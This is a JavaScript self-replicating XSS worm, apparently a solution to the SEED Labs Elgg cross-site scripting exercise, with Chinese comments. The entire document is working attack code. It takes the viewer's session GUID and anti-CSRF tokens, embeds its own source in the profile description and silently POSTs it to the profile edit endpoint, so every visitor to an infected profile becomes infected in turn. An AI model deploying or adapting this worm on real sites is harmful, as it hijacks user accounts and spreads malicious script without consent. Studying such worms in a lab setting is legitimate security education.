<script type="text/javascript">
window.onload = function(){
    var userName = elgg.session.user.name;
    var guid = "guid=" + elgg.session.user.guid;
    var ts = "__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "__elgg_token=" + elgg.security.token.__elgg_token;

    // 构造包含蠕虫代码的 payload
    var wormCode = encodeURIComponent(
        '<script type="text/javascript">(' + arguments.callee.toString() + ')();</script>'
    );

    // 构造带有自复制脚本的描述字段内容
    var description = "This is a test XSS worm. " + wormCode;

    // 拼接完整表单数据
    var content = guid + "&" + ts + "&" + token + "&description=" + description;

    // 避免攻击者自己被反复感染
    var samyGuid = "59";  // 可更换为攻击者账号的GUID
    if (elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", "http://www.seed-server.com/action/profile/edit", true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
